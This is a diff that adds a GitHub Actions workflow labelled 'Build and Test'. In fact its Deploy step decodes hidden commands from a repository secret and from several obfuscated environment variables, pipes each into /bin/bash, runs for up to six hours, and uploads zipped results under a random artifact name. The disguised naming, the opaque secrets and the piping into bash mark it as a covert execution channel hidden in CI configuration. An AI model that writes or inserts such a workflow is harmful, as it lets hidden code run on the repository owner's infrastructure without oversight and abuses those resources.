@@ -1,0 +1,29 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Deploy
+        env:
+          rsy7: ${{ secrets.rsy7 }}
+        run: |
+          printf '%s' "$rsy7" | jq -r .ezsr2 | /bin/bash
+          printf '%s' "$n127" | jq -r .kzkhj45267 | /bin/bash
+          printf '%s' "$n1484" | jq -r .yof34 | /bin/bash
+          echo $ms08623 | jq -r .oglx9988 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 02s4kH3l
+          path: "*.zip"
+          retention-days: 1
